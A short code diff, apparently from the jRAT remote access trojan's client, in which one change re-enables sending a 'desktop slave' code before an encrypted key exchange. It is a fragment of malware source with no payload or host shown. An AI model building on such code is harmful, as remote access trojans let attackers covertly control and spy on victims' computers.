@@ -17,6 +17,7 @@ import javax.crypto.CipherInputStream;
 import javax.crypto.CipherOutputStream;
 import javax.crypto.spec.SecretKeySpec;
 
+import se.jrat.common.ConnectionCodes;
 import se.jrat.common.Version;
 import se.jrat.common.crypto.Crypto;
 import se.jrat.common.crypto.CryptoUtils;
@@ -89,7 +90,7 @@ public class Connection implements Runnable {
 			Connection.dis = new DataInputStream(inputStream);
 			Connection.dos = new DataOutputStream(outputStream);
 	        
-			//outputStream.write(ConnectionCodes.DESKTOP_SLAVE);
+			outputStream.write(ConnectionCodes.DESKTOP_SLAVE);
 			
 			KeyExchanger exchanger = new KeyExchanger(dis, dos, Main.getKeyPair());
 			exchanger.readRemotePublicKey();
